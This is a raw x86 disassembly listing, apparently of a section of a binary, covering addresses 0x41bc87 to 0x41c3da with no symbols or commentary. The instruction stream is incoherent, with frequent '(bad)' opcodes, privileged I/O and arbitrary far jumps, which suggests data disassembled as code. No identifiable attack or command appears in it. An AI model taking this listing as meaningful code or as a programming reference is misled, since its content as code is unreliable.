  41bc87:	cmp    ecx,DWORD PTR [edi]
  41bc89:	push   0xffffff80
  41bc8b:	sub    eax,0x3357d546
  41bc90:	add    BYTE PTR [edx],ah
  41bc92:	cmp    DWORD PTR [ebx-0x1d],eax
  41bc95:	gs mov edx,0x6fbcdc67
  41bc9b:	xchg   BYTE PTR [esi+0x35122489],ch
  41bca1:	pusha  
  41bca2:	xlat   BYTE PTR ds:[ebx]
  41bca3:	mov    ebp,0xa2319092
  41bca8:	cmp    al,0x39
  41bcaa:	into   
  41bcab:	sub    edi,ebx
  41bcad:	je     0x41bcb5
  41bcaf:	xor    eax,0x34cb4026
  41bcb4:	lock mov ebx,0xe886528b
  41bcba:	mov    esi,0xb5f1c94d
  41bcbf:	fnstsw WORD PTR [edi+0x4d]
  41bcc2:	adc    al,BYTE PTR [edi-0x3e]
  41bcc5:	mov    edi,DWORD PTR [ebx+0x54176f7f]
  41bccb:	xchg   esp,eax
  41bccc:	dec    esi
  41bccd:	push   ecx
  41bcce:	add    BYTE PTR [edi],0xbd
  41bcd1:	mov    ecx,0xcca4d1ab
  41bcd6:	pop    eax
  41bcd7:	mov    bl,0x59
  41bcd9:	pop    ds
  41bcda:	mov    esi,0x5965fdaa
  41bcdf:	cdq    
  41bce0:	outs   dx,DWORD PTR ds:[esi]
  41bce1:	fidivr WORD PTR [esi+eax*2]
  41bce4:	mov    al,ds:0xe11d917b
  41bce9:	inc    edi
  41bcea:	cmp    BYTE PTR [edi+0x52ff4423],bh
  41bcf0:	retf   0xd38c
  41bcf3:	mov    dl,0x36
  41bcf5:	inc    esi
  41bcf6:	jno    0x41bc9a
  41bcf8:	jns    0x41bd24
  41bcfa:	mov    bh,0xfd
  41bcfc:	psubb  mm1,QWORD PTR [edx]
  41bcff:	inc    edi
  41bd00:	dec    ebp
  41bd01:	inc    edi
  41bd02:	dec    esp
  41bd03:	xchg   ecx,eax
  41bd04:	adc    DWORD PTR [ebx],0x25834f76
  41bd0a:	inc    ebp
  41bd0b:	jmp    0xc4d8:0xa59624ab
  41bd12:	mov    DWORD PTR [eax+0x40],0xe0c153d3
  41bd19:	enter  0xeb3d,0xf7
  41bd1d:	outs   dx,BYTE PTR ds:[esi]
  41bd1e:	mov    BYTE PTR [edx-0x3c59fc3d],ah
  41bd24:	pop    eax
  41bd25:	lds    esi,FWORD PTR [esi]
  41bd27:	push   ebx
  41bd28:	(bad)  
  41bd29:	in     eax,0xc6
  41bd2b:	xchg   al,ch
  41bd2d:	dec    ecx
  41bd2e:	jmp    0xc114:0xc5121ca3
  41bd35:	and    bh,BYTE PTR [edi-0x33cdbc89]
  41bd3b:	cdq    
  41bd3c:	pop    ss
  41bd3d:	sub    eax,0x834b57af
  41bd42:	clc    
  41bd43:	fmul   QWORD PTR [ebx-0x68]
  41bd46:	push   ss
  41bd47:	mov    dl,BYTE PTR [edx]
  41bd49:	test   BYTE PTR [ecx],dl
  41bd4b:	push   ebx
  41bd4c:	sub    al,BYTE PTR [esi]
  41bd4e:	fwait
  41bd4f:	sahf   
  41bd50:	gs scas al,BYTE PTR es:[edi]
  41bd52:	sahf   
  41bd53:	xor    eax,0x54480727
  41bd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd59:	outs   dx,DWORD PTR ds:[esi]
  41bd5a:	jnp    0x41bcdf
  41bd5c:	xchg   ecx,eax
  41bd5d:	into   
  41bd5e:	fisttp DWORD PTR [edi-0x66]
  41bd61:	dec    ebp
  41bd62:	fist   WORD PTR [ecx]
  41bd64:	shl    DWORD PTR [ebx+0xca7cd9c],cl
  41bd6a:	(bad)  
  41bd6b:	sub    al,0x15
  41bd6d:	shl    DWORD PTR fs:[ecx-0x7a],0x66
  41bd72:	jo     0x41bd6c
  41bd74:	mov    edi,esi
  41bd76:	pop    eax
  41bd77:	push   ds
  41bd78:	cmp    al,0xab
  41bd7a:	addr16 std 
  41bd7c:	test   eax,0x4f469514
  41bd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd82:	ins    BYTE PTR es:[edi],dx
  41bd83:	pusha  
  41bd84:	mov    edi,DWORD PTR ds:0x73bf95ba
  41bd8a:	lods   al,BYTE PTR ds:[esi]
  41bd8b:	mov    edi,0x8042db63
  41bd90:	ja     0x41bd94
  41bd92:	adc    BYTE PTR [ecx-0x66b3a63],bh
  41bd98:	(bad)  
  41bd99:	fdivr  QWORD PTR [ebx*4-0x2f682ee3]
  41bda0:	xor    eax,0x24c1b1e2
  41bda5:	mov    cl,0x2e
  41bda7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bda8:	out    dx,al
  41bda9:	dec    ebp
  41bdaa:	cmp    eax,0x4c0513c5
  41bdaf:	xchg   esp,eax
  41bdb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdb1:	push   esp
  41bdb2:	xchg   ebx,edi
  41bdb4:	in     al,dx
  41bdb5:	mov    dh,BYTE PTR [ecx+eiz*1]
  41bdb8:	aam    0xd4
  41bdba:	and    eax,0x744639c4
  41bdbf:	xchg   ebx,ecx
  41bdc1:	test   al,0xb0
  41bdc3:	pop    esp
  41bdc4:	mov    ebp,0x74dc903c
  41bdc9:	adc    BYTE PTR [edx+0x8b4e37],dl
  41bdcf:	pushf  
  41bdd0:	test   eax,0x2233ead8
  41bdd5:	sub    al,0x15
  41bdd7:	retf   
  41bdd8:	dec    edi
  41bdd9:	mov    ecx,0x79e9059c
  41bdde:	cs jmp 0x41bd63
  41bde1:	outs   dx,DWORD PTR ds:[esi]
  41bde2:	sbb    DWORD PTR [ebp-0x343982a9],0xffffffe8
  41bde9:	ja     0x41be34
  41bdeb:	mov    esp,0xf3e97e29
  41bdf0:	sbb    al,0x3f
  41bdf2:	cmp    ch,al
  41bdf4:	jbe    0x41be2a
  41bdf6:	mov    ch,0xf0
  41bdf8:	daa    
  41bdf9:	icebp  
  41bdfa:	retf   0xefcc
  41bdfd:	test   DWORD PTR [edi-0x6cd32c1b],ebx
  41be03:	jecxz  0x41be24
  41be05:	rcl    BYTE PTR [esp+edx*8-0x39],0xa3
  41be0a:	scas   eax,DWORD PTR es:[edi]
  41be0b:	add    DWORD PTR [ebp-0x5d],esp
  41be0e:	pop    ebp
  41be0f:	push   ebx
  41be10:	pop    esp
  41be11:	sahf   
  41be12:	sahf   
  41be13:	push   edi
  41be14:	sti    
  41be15:	sbb    eax,0x551b1e62
  41be1a:	sub    BYTE PTR [ebx-0x5e],dh
  41be1d:	adc    DWORD PTR [ecx],0x5f
  41be20:	mov    bl,0x3c
  41be22:	in     eax,0xaf
  41be24:	scas   al,BYTE PTR es:[edi]
  41be25:	adc    BYTE PTR [edx-0x47],bl
  41be28:	inc    esi
  41be29:	and    BYTE PTR [edx+0x4a],al
  41be2c:	mov    ebp,0x49516650
  41be31:	add    eax,0x2ccf5058
  41be36:	jmp    FWORD PTR fs:[esi+ebp*1+0x30]
  41be3b:	jbe    0x41be2e
  41be3d:	and    al,0x5d
  41be3f:	xchg   edi,eax
  41be40:	stos   DWORD PTR es:[edi],eax
  41be41:	xor    BYTE PTR [ecx+0x6948bfc],bl
  41be47:	fidivr DWORD PTR [ecx-0x6e43adb0]
  41be4d:	call   0x111b04c6
  41be52:	scas   eax,DWORD PTR es:[edi]
  41be53:	mov    dh,0xc
  41be55:	mov    cl,0xa4
  41be57:	jmp    DWORD PTR [edi]
  41be59:	das    
  41be5a:	mov    ah,0x60
  41be5c:	sti    
  41be5d:	pushf  
  41be5e:	jg     0x41bea8
  41be60:	in     al,dx
  41be61:	mov    bh,0xd6
  41be63:	jbe    0x41be2d
  41be65:	scas   al,BYTE PTR es:[edi]
  41be66:	mov    WORD PTR [ebp+0x68],ds
  41be69:	dec    ecx
  41be6a:	xor    ebx,eax
  41be6c:	pop    ecx
  41be6d:	mul    BYTE PTR [edi+0x48]
  41be70:	jne    0x41be90
  41be72:	mov    bh,0xa2
  41be74:	cld    
  41be75:	test   eax,0x466c7465
  41be7a:	mov    ebp,DWORD PTR [ebx]
  41be7c:	xor    bh,BYTE PTR [edx+0x48]
  41be7f:	das    
  41be80:	xor    eax,0x314eaeba
  41be85:	(bad)  
  41be86:	fwait
  41be87:	lds    ebp,FWORD PTR [ebx+0x3a45f276]
  41be8d:	add    BYTE PTR [edi+0x81bdac],cl
  41be93:	into   
  41be94:	popaw  
  41be96:	add    eax,0x68e074f6
  41be9b:	and    DWORD PTR [ebp-0x51d757dc],eax
  41bea1:	xor    DWORD PTR [ebx],0x4cfd0528
  41bea7:	ds pop ebp
  41bea9:	arpl   WORD PTR [ebx-0x78],bx
  41beac:	leave  
  41bead:	pusha  
  41beae:	sbb    ah,BYTE PTR [edx+0x23075dbe]
  41beb4:	push   esp
  41beb5:	push   edi
  41beb6:	xor    ebx,DWORD PTR [ecx+ebx*1+0x4e6494c2]
  41bebd:	mul    ch
  41bebf:	push   es
  41bec0:	or     BYTE PTR [edi],0x1d
  41bec3:	xor    DWORD PTR [eax-0x69],esi
  41bec6:	shl    DWORD PTR [ebp+0x145abac0],0x37
  41becd:	int    0x27
  41becf:	loope  0x41be62
  41bed1:	or     eax,0x58cff102
  41bed6:	and    BYTE PTR [ebx+eax*4],ch
  41bed9:	adc    ah,bh
  41bedb:	(bad)  
  41bedc:	shr    DWORD PTR [esi-0x57604d6],cl
  41bee2:	into   
  41bee3:	sub    eax,0x6c784ddb
  41bee8:	mov    ebp,0x35a13c47
  41beed:	(bad)  
  41beee:	sar    bh,cl
  41bef0:	fcmove st,st(3)
  41bef2:	call   0x7d7a:0xe5f4f80f
  41bef9:	inc    esp
  41befa:	xchg   ebp,eax
  41befb:	fidiv  DWORD PTR [edi-0x724248ac]
  41bf01:	inc    esi
  41bf02:	push   es
  41bf03:	mov    dl,0xec
  41bf05:	pusha  
  41bf06:	push   ebx
  41bf07:	fisubr WORD PTR [esi-0x7d]
  41bf0a:	pop    edi
  41bf0b:	out    0xbc,al
  41bf0d:	and    esp,DWORD PTR [ecx-0x2e]
  41bf10:	pop    DWORD PTR [ebp+0x3]
  41bf13:	sbb    al,0x6e
  41bf15:	inc    esi
  41bf16:	ss ss fsubr st,st(5)
  41bf1a:	retf   
  41bf1b:	lock icebp 
  41bf1d:	ss push ebx
  41bf1f:	mov    ds:0xe38d9565,al
  41bf24:	shl    bh,1
  41bf26:	outs   dx,BYTE PTR ds:[esi]
  41bf27:	stc    
  41bf28:	ins    BYTE PTR es:[edi],dx
  41bf29:	add    BYTE PTR [ebp-0x80eb12d],bh
  41bf2f:	jb     0x41bf98
  41bf31:	pop    eax
  41bf32:	(bad)  
  41bf33:	push   es
  41bf34:	mov    dl,0x78
  41bf36:	adc    esi,DWORD PTR [esi+0x1d]
  41bf39:	movd   DWORD PTR [edx],mm3
  41bf3c:	pop    esi
  41bf3d:	mov    dh,BYTE PTR [esi+0x50]
  41bf40:	mov    esi,edx
  41bf42:	test   BYTE PTR ds:0x60a84d5f,bh
  41bf48:	enter  0x7326,0xa8
  41bf4c:	icebp  
  41bf4d:	and    eax,0xdf192eb0
  41bf52:	in     eax,dx
  41bf53:	mov    eax,0x44f99c77
  41bf58:	push   eax
  41bf59:	out    dx,eax
  41bf5a:	cs aad 0x10
  41bf5d:	push   ecx
  41bf5e:	pop    ds
  41bf5f:	dec    ebp
  41bf60:	ret    0x538e
  41bf63:	lock cmp al,0xae
  41bf66:	jge    0x41bfb7
  41bf68:	sbb    dl,BYTE PTR [edx+0x5b]
  41bf6b:	push   edi
  41bf6c:	pop    ebp
  41bf6d:	push   esi
  41bf6e:	lds    edx,FWORD PTR [ebp-0x3]
  41bf71:	xor    bl,dl
  41bf73:	pop    ecx
  41bf74:	(bad)  
  41bf75:	das    
  41bf76:	lea    edi,ds:0xba54e689
  41bf7c:	out    dx,al
  41bf7d:	sub    al,0x4d
  41bf7f:	dec    ebp
  41bf80:	fadd   DWORD PTR cs:[edx-0x2a]
  41bf84:	mov    cl,0x8
  41bf86:	mov    BYTE PTR [edi+0x612880c8],0x78
  41bf8d:	mov    ecx,0xd5be10a7
  41bf92:	shl    BYTE PTR [esi-0x691a0211],0x6e
  41bf99:	xchg   ebp,edx
  41bf9b:	adc    DWORD PTR [eax],ebx
  41bf9d:	fist   DWORD PTR [edx-0x62]
  41bfa0:	scas   eax,DWORD PTR es:[edi]
  41bfa1:	xchg   BYTE PTR [edi-0x65df33af],bh
  41bfa7:	aad    0xdf
  41bfa9:	fcomp  QWORD PTR [edi-0x49]
  41bfac:	dec    ecx
  41bfad:	fadd   st(1),st
  41bfaf:	jo     0x41c01e
  41bfb1:	imul   BYTE PTR [esi-0x1f]
  41bfb4:	adc    eax,0x3b8a6169
  41bfb9:	cmp    dl,dh
  41bfbb:	add    BYTE PTR [esi],bl
  41bfbd:	sub    eax,0x68eabd53
  41bfc2:	add    eax,0x8d4f2809
  41bfc7:	sub    esp,DWORD PTR [ebx-0x6537c0cc]
  41bfcd:	cli    
  41bfce:	push   esi
  41bfcf:	rol    DWORD PTR [eax+ebp*8],0xfe
  41bfd3:	cdq    
  41bfd4:	pop    ss
  41bfd5:	aad    0x7b
  41bfd7:	pop    eax
  41bfd8:	mov    esi,0x1ae0d04a
  41bfdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfde:	push   0xffffffeb
  41bfe0:	xchg   edi,eax
  41bfe1:	cdq    
  41bfe2:	mov    esp,0x8871bb1c
  41bfe7:	retf   0x47c6
  41bfea:	clc    
  41bfeb:	xor    dh,BYTE PTR [edx]
  41bfed:	push   0x19
  41bfef:	and    DWORD PTR [edx+0x66604e7e],esp
  41bff5:	sub    DWORD PTR [ebx-0x57],eax
  41bff8:	pop    esp
  41bff9:	mov    WORD PTR [ecx],gs
  41bffb:	xor    ebx,DWORD PTR [edi]
  41bffd:	mov    al,ds:0x3b2a6535
  41c002:	fwait
  41c003:	cwde   
  41c004:	leave  
  41c005:	daa    
  41c006:	inc    ebx
  41c007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c008:	cdq    
  41c009:	(bad)  
  41c00a:	xlat   BYTE PTR ds:[ebx]
  41c00b:	outs   dx,BYTE PTR ds:[esi]
  41c00c:	sti    
  41c00d:	repnz mov ecx,DWORD PTR [ebp+0x36]
  41c011:	mov    ebp,DWORD PTR [edi+ebp*8]
  41c014:	adc    edi,eax
  41c016:	xlat   BYTE PTR ds:[ebx]
  41c017:	mov    cl,0xc0
  41c019:	neg    al
  41c01b:	mov    al,0xa9
  41c01d:	aad    0x2d
  41c01f:	push   ebp
  41c020:	rol    DWORD PTR [ecx-0x1375aa4f],0x89
  41c027:	loopne 0x41c008
  41c029:	out    dx,al
  41c02a:	mov    ecx,DWORD PTR [ebx-0x42]
  41c02d:	mov    al,dl
  41c02f:	jg     0x41c09d
  41c031:	mov    WORD PTR [edi+edi*2],ds
  41c034:	xchg   ecx,eax
  41c035:	xor    ecx,esi
  41c037:	clc    
  41c038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c039:	adc    al,0x65
  41c03b:	repnz pop edx
  41c03d:	jae    0x41bfff
  41c03f:	mov    eax,ds:0x283677b3
  41c044:	dec    edx
  41c045:	mov    al,0xac
  41c047:	cli    
  41c048:	mov    eax,0x351d14a2
  41c04d:	test   al,0xf4
  41c04f:	stos   BYTE PTR es:[edi],al
  41c050:	ds call 0xc63308c3
  41c056:	repz fmul st(5),st
  41c059:	loopne 0x41c062
  41c05b:	lods   al,BYTE PTR ds:[esi]
  41c05c:	into   
  41c05d:	mov    ch,0xd9
  41c05f:	arpl   WORD PTR [ebx+0x2d],cx
  41c062:	jle    0x41c038
  41c064:	cmp    al,0xbd
  41c066:	aad    0x44
  41c068:	dec    esi
  41c069:	and    ecx,DWORD PTR [eax]
  41c06b:	pop    esi
  41c06c:	inc    eax
  41c06d:	pusha  
  41c06e:	sub    DWORD PTR [ebp+ecx*4-0x30],ebp
  41c072:	xor    esp,DWORD PTR [edi+0x17263f31]
  41c078:	pop    ecx
  41c079:	dec    ebx
  41c07a:	shl    BYTE PTR [edi],0x71
  41c07d:	inc    eax
  41c07e:	int3   
  41c07f:	(bad)  
  41c080:	push   cs
  41c081:	pop    eax
  41c082:	call   0x167cfeb
  41c087:	stos   DWORD PTR es:[edi],eax
  41c088:	and    ah,BYTE PTR [edi+0x6c8ef5b]
  41c08e:	shl    DWORD PTR [esi+0x5cb8307a],0x14
  41c095:	loopne 0x41c071
  41c097:	outs   dx,BYTE PTR ds:[esi]
  41c098:	sub    BYTE PTR ds:0x8083733,ah
  41c09e:	xor    dl,BYTE PTR [esi+0x76]
  41c0a1:	push   esp
  41c0a2:	ret    0x463d
  41c0a5:	cmp    ah,BYTE PTR [esi-0x15]
  41c0a8:	aaa    
  41c0a9:	xor    al,0x44
  41c0ab:	fisttp DWORD PTR [edx-0x39a832b7]
  41c0b1:	cld    
  41c0b2:	adc    al,0x58
  41c0b4:	das    
  41c0b5:	imul   ecx,DWORD PTR [edi+0x30],0x5b
  41c0b9:	or     BYTE PTR [ecx-0x7e34e39e],ah
  41c0bf:	fimul  DWORD PTR [edi-0x7]
  41c0c2:	mov    eax,ds:0x823c796a
  41c0c7:	(bad)  
  41c0c8:	inc    ebp
  41c0c9:	sbb    ebp,eax
  41c0cb:	push   ebp
  41c0cc:	sub    al,bl
  41c0ce:	or     DWORD PTR [ecx],eax
  41c0d0:	dec    edx
  41c0d1:	pusha  
  41c0d2:	or     eax,0xdc56c3df
  41c0d7:	jg     0x41c0c2
  41c0d9:	dec    esi
  41c0da:	call   0x1ff0ae6e
  41c0df:	pop    esp
  41c0e0:	lock xor esp,DWORD PTR [edi+ebx*1]
  41c0e4:	fsubr  DWORD PTR [ecx+0x28e9bca5]
  41c0ea:	add    al,0x70
  41c0ec:	out    0xda,eax
  41c0ee:	inc    esi
  41c0ef:	sub    ebp,DWORD PTR [esi+0x5dd0ad2d]
  41c0f5:	xchg   ebp,eax
  41c0f6:	xor    eax,0xebbef419
  41c0fb:	sbb    BYTE PTR [edx+0x27],0xb7
  41c0ff:	jg     0x41c177
  41c101:	adc    al,0x6c
  41c103:	cmp    DWORD PTR [edi-0x1a482cf9],ecx
  41c109:	sahf   
  41c10a:	ret    
  41c10b:	popa   
  41c10c:	int3   
  41c10d:	sahf   
  41c10e:	push   cs
  41c10f:	dec    edx
  41c110:	cmp    eax,0xb59ca19d
  41c115:	adc    eax,0x28ab967c
  41c11a:	test   ecx,esp
  41c11c:	shr    esp,0xee
  41c11f:	fistp  QWORD PTR [edi]
  41c121:	push   ss
  41c122:	icebp  
  41c123:	in     eax,0xc9
  41c125:	jle    0x41c0e7
  41c127:	bound  eax,QWORD PTR [ebx]
  41c129:	es sbb al,0x69
  41c12c:	adc    eax,0xc33edd8
  41c131:	adc    edi,DWORD PTR [edx+eax*4+0x731bb50c]
  41c138:	stc    
  41c139:	mov    al,0x94
  41c13b:	fiadd  WORD PTR [esi+0x7f]
  41c13e:	and    edx,DWORD PTR [ebx]
  41c140:	das    
  41c141:	adc    DWORD PTR [ebp+0x6c4023a7],ecx
  41c147:	dec    ecx
  41c148:	sti    
  41c149:	pusha  
  41c14a:	jno    0x41c1bb
  41c14c:	ror    DWORD PTR [ebp+0x1f7e7a4e],0x6b
  41c153:	sahf   
  41c154:	ins    DWORD PTR es:[edi],dx
  41c155:	iret   
  41c156:	mov    bl,0x5e
  41c158:	dec    ecx
  41c159:	sub    eax,0xab600efe
  41c15e:	dec    ebp
  41c15f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c161:	xchg   esp,eax
  41c162:	jmp    0x41c1de
  41c164:	clc    
  41c165:	xchg   DWORD PTR [eax+0x2d],ebp
  41c168:	sbb    DWORD PTR [eax-0x14],0x86dabf65
  41c16f:	(bad)  
  41c170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c171:	or     esi,DWORD PTR [ebp-0x792d3115]
  41c177:	or     ebx,DWORD PTR [ecx]
  41c179:	jmp    0x41c1a7
  41c17b:	in     eax,dx
  41c17c:	push   ebx
  41c17d:	push   esp
  41c17e:	test   al,0x54
  41c180:	sub    BYTE PTR [esi+0x48],ch
  41c183:	cmc    
  41c184:	aas    
  41c185:	or     BYTE PTR [ecx-0x1e3f9788],ah
  41c18b:	in     al,dx
  41c18c:	mov    bl,0x90
  41c18e:	dec    esi
  41c18f:	mov    BYTE PTR [ebx],al
  41c191:	push   ds
  41c192:	loope  0x41c13f
  41c194:	add    eax,0x9a404529
  41c199:	jo     0x41c164
  41c19b:	call   0x9ad3:0xe10234d6
  41c1a2:	sub    DWORD PTR [ecx-0xa],ecx
  41c1a5:	fst    QWORD PTR [ebx+0x52]
  41c1a8:	out    dx,al
  41c1a9:	add    bl,BYTE PTR [esi-0x20]
  41c1ac:	repnz retf 0x7ebc
  41c1b0:	add    DWORD PTR [edx+ebx*8+0x2c443c39],ecx
  41c1b7:	adc    BYTE PTR [edx-0x4c3a6063],ah
  41c1bd:	cs imul edi,eax,0x5edf48f0
  41c1c4:	cld    
  41c1c5:	xchg   edi,eax
  41c1c6:	cmp    BYTE PTR [eax+esi*4-0x71],ah
  41c1ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1cb:	add    BYTE PTR [ecx+0xf3c4645],al
  41c1d1:	jne    0x41c240
  41c1d3:	ss stos BYTE PTR es:[edi],al
  41c1d5:	rol    esp,0x3a
  41c1d8:	and    eax,0x4a0a61cf
  41c1dd:	fistp  DWORD PTR [esi]
  41c1df:	jp     0x41c17d
  41c1e1:	push   ss
  41c1e2:	adc    BYTE PTR [edi-0x5b499675],al
  41c1e8:	cmp    eax,DWORD PTR [edi+ecx*8-0x57]
  41c1ec:	enter  0x150,0xe3
  41c1f0:	xchg   ebx,eax
  41c1f1:	ins    DWORD PTR es:[edi],dx
  41c1f2:	sar    BYTE PTR [ebx],0x59
  41c1f5:	es out dx,eax
  41c1f7:	arpl   WORD PTR [ebx-0x3b],cx
  41c1fa:	ret    
  41c1fb:	fistp  WORD PTR [eax+eiz*4-0x71]
  41c1ff:	adc    al,0x70
  41c201:	dec    ecx
  41c202:	retf   0x5ef8
  41c205:	cmp    DWORD PTR [ecx-0x5d],eax
  41c208:	mov    edi,0xb93f0043
  41c20d:	and    BYTE PTR [edi],0x79
  41c210:	mov    esp,0x8c6c69bf
  41c215:	into   
  41c216:	in     eax,0xaf
  41c218:	push   ds
  41c219:	xchg   DWORD PTR [ecx+edi*2],ecx
  41c21c:	movups XMMWORD PTR ds:0xba6024db,xmm6
  41c223:	(bad)  
  41c224:	jmp    0xdfdc0e24
  41c229:	aam    0x8d
  41c22b:	cmp    ebp,DWORD PTR ds:[esi-0x2]
  41c22f:	mov    esp,0xf1a38715
  41c234:	fldenv [eax+0x8027be]
  41c23a:	sub    dh,BYTE PTR [ebx-0x70d3b002]
  41c240:	push   edi
  41c241:	mov    cl,0x2c
  41c243:	xchg   ebx,eax
  41c244:	pop    ecx
  41c245:	dec    edx
  41c246:	sbb    esp,edx
  41c248:	lods   al,BYTE PTR ds:[esi]
  41c249:	rol    BYTE PTR [edi+0x5d],1
  41c24c:	mov    eax,ds:0xb631116c
  41c251:	cmc    
  41c252:	mov    dl,0x4f
  41c254:	call   DWORD PTR [esi+0x3e]
  41c257:	adc    edx,DWORD PTR [eax]
  41c259:	lods   eax,DWORD PTR ds:[esi]
  41c25a:	shl    ebx,0xd3
  41c25d:	sbb    DWORD PTR [ebx-0x5b6cac7e],esp
  41c263:	mov    ecx,0x38e05e82
  41c268:	sub    DWORD PTR [ecx+eax*2-0x7],0x28
  41c26d:	add    BYTE PTR [edx],ch
  41c26f:	imul   esi,DWORD PTR [edx],0x483d078b
  41c275:	lods   al,BYTE PTR ds:[esi]
  41c276:	cmp    ebx,DWORD PTR [esi-0x59]
  41c279:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41c27b:	dec    edi
  41c27c:	cdq    
  41c27d:	mov    ah,BYTE PTR [edi-0x50]
  41c280:	add    ebx,DWORD PTR [edx]
  41c282:	sub    eax,0x5422e8e4
  41c287:	dec    ebp
  41c288:	sub    eax,0x209be5ca
  41c28d:	ret    
  41c28e:	xchg   ebp,eax
  41c28f:	sar    DWORD PTR [ebp-0x6300b5df],1
  41c295:	fs pop es
  41c297:	ret    
  41c298:	sar    edi,1
  41c29a:	jle    0x41c2e7
  41c29c:	push   ss
  41c29d:	mov    ebx,0xf83ec8b7
  41c2a2:	outs   dx,DWORD PTR ds:[esi]
  41c2a3:	or     eax,0xf6a40cd6
  41c2a8:	mov    esi,DWORD PTR [edx-0x3b]
  41c2ab:	dec    ebp
  41c2ac:	enter  0xfcf8,0x85
  41c2b0:	sub    al,0x4
  41c2b2:	loop   0x41c261
  41c2b4:	push   cs
  41c2b5:	add    DWORD PTR [edx-0xf16bba8],edi
  41c2bb:	enter  0x69d6,0xf3
  41c2bf:	inc    edx
  41c2c0:	xchg   edi,eax
  41c2c1:	fadd   DWORD PTR [esi+0x50]
  41c2c4:	push   ebp
  41c2c5:	push   esi
  41c2c6:	mov    DWORD PTR [esi-0x12],ecx
  41c2c9:	xlat   BYTE PTR ds:[ebx]
  41c2ca:	xchg   esp,eax
  41c2cb:	aaa    
  41c2cc:	aam    0x91
  41c2ce:	call   0x499e:0x5ccc6d5e
  41c2d5:	adc    ecx,ebp
  41c2d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2d8:	inc    ecx
  41c2d9:	and    edi,DWORD PTR [edi+0x21]
  41c2dc:	cs xchg ebx,eax
  41c2de:	push   ebx
  41c2df:	leave  
  41c2e0:	sbb    WORD PTR [bx+di+0x4],cx
  41c2e5:	and    BYTE PTR [esi+0x1b831921],cl
  41c2eb:	sub    DWORD PTR [ebx-0x54],ebx
  41c2ee:	fsubp  st(4),st
  41c2f0:	hlt    
  41c2f1:	jp     0x41c2a1
  41c2f3:	daa    
  41c2f4:	pop    es
  41c2f5:	je     0x41c345
  41c2f7:	or     eax,0xdeea9e95
  41c2fc:	dec    ebp
  41c2fd:	xchg   edi,eax
  41c2fe:	jne    0x41c2e4
  41c300:	xor    al,0xd5
  41c302:	and    al,0x4a
  41c304:	xor    eax,0xd55a0227
  41c309:	pop    ss
  41c30a:	push   esi
  41c30b:	or     BYTE PTR [edx-0x251452b3],0x81
  41c312:	dec    ecx
  41c313:	pop    ss
  41c314:	into   
  41c315:	cwde   
  41c316:	cmpps  xmm6,XMMWORD PTR [eax],0xc4
  41c31a:	int    0x3
  41c31c:	mov    al,0x94
  41c31e:	rcr    DWORD PTR [eax-0x4e24e697],0xb5
  41c325:	mov    BYTE PTR [edi-0x1b],cl
  41c328:	hlt    
  41c329:	and    BYTE PTR [edi*8+0x33826021],0xb0
  41c331:	leave  
  41c332:	(bad)  
  41c334:	in     eax,dx
  41c335:	mov    al,ds:0x55620f08
  41c33a:	add    dh,0x12
  41c33d:	test   eax,0xabfed87c
  41c342:	fwait
  41c343:	mov    esi,es
  41c345:	daa    
  41c346:	mov    edx,0x938f0af3
  41c34b:	push   cs
  41c34c:	rcl    cl,0x28
  41c34f:	jmp    0x41c321
  41c351:	jecxz  0x41c35c
  41c353:	lea    esp,[esi-0x3ae60a42]
  41c359:	lods   eax,DWORD PTR fs:[esi]
  41c35b:	xchg   esp,eax
  41c35c:	push   ss
  41c35d:	icebp  
  41c35e:	inc    esp
  41c35f:	and    BYTE PTR [esi],0xff
  41c362:	js     0x41c30d
  41c364:	rcr    BYTE PTR [ebx+0x100d110d],cl
  41c36a:	pop    ss
  41c36b:	sub    BYTE PTR [esi-0x2d],dh
  41c36e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c36f:	into   
  41c370:	dec    eax
  41c371:	xchg   DWORD PTR [ebx],esp
  41c373:	push   0xffffffd0
  41c375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c376:	xor    bl,BYTE PTR [esi]
  41c378:	nop
  41c379:	xor    al,0x9e
  41c37b:	(bad)  
  41c37c:	fidiv  DWORD PTR [eax]
  41c37e:	jae    0x41c3af
  41c380:	ret    
  41c381:	not    BYTE PTR [edi]
  41c383:	xchg   BYTE PTR [ebx-0x4],cl
  41c386:	mov    eax,ds:0x219ff9ec
  41c38b:	loope  0x41c329
  41c38d:	add    ebp,DWORD PTR [ebx-0x68]
  41c390:	jg     0x41c3c9
  41c392:	fsub   DWORD PTR [edi-0x42cbac6a]
  41c398:	jno    0x41c384
  41c39a:	adc    BYTE PTR [esi],ah
  41c39c:	add    esp,eax
  41c39e:	mov    dl,0x13
  41c3a0:	mov    eax,ds:0xf39dcdc3
  41c3a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3a6:	adc    al,BYTE PTR [edi-0x34]
  41c3a9:	stos   DWORD PTR es:[edi],eax
  41c3aa:	lock adc eax,0xe6549f99
  41c3b0:	dec    esi
  41c3b1:	xchg   edx,eax
  41c3b2:	cmp    eax,DWORD PTR [edx+0x7d]
  41c3b5:	pop    eax
  41c3b6:	test   DWORD PTR [ebp-0x6e63f629],ebx
  41c3bc:	mov    esi,0xf2df0a2e
  41c3c1:	dec    ecx
  41c3c2:	xlat   BYTE PTR ds:[ebx]
  41c3c3:	sbb    dl,al
  41c3c5:	scas   al,BYTE PTR es:[edi]
  41c3c6:	push   ecx
  41c3c7:	das    
  41c3c8:	out    0xb9,eax
  41c3ca:	test   DWORD PTR [edx+0x1d810000],ecx
  41c3d0:	or     al,0xc0
  41c3d2:	inc    edx
  41c3d3:	add    BYTE PTR [eax+eiz*4],bl
  41c3d6:	inc    edx
  41c3d7:	add    BYTE PTR [esi+0x33],ah
  41c3da:	dec    esp
